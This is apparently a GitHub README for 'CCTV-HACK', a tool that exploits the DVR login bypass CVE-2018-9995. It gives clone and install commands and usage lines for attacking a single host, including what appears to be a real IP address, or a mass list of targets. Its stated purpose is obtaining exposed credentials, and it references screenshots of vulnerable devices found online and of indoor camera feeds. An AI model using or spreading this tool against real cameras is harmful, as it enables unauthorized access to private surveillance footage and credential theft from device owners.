#  [Exploit] DVR LOGIN BYPASS (CCTV-HACK)
<p>  
CVE:                CVE-2018-9995
CVSS Base Score v3:      7.3 / 10
</p>

	
![DVR_wall](screenshot/videowall.jpg) 


# On the Wild:

![DVR_dorks_2](screenshot/d1.jpg)
![DVR_dorks_3](screenshot/d2.png)

## Possible Banners frontend (web):
![DVR_login_1](screenshot/login1.jpg)
![DVR_login_2](screenshot/login2.jpg)
![DVR_login_3](screenshot/login3.jpg)

## Indoor:
![DVR_indoor_1](screenshot/in.jpg)
![DVR_indoor_2](screenshot/in1.jpg)
![DVR_indoor_3](screenshot/in2.jpg)



# TOOL: "CCTV-HACK"

## Installation Code
'''

	git clone https://github.com/tausifzaman/cctv-hack
	cd cctv-hack
	pip install -r requirements.txt
    python cctv.py

'''

## Usages 

	usage: python cctv.py
or,             python cctv.py --host 109.100.130.57 --port 8000
or,             python cctv.py -m target.txt

	[+] Obtaining Exposed credentials

options:
  -h, --help            show this help message and exit
  --host HOST           Host
  --port PORT           Port
  -m MASS, --mass MASS  File with host:port or URL list


## Pocs (Output) :
![DVR_poc_4](screenshot/output.jpg)


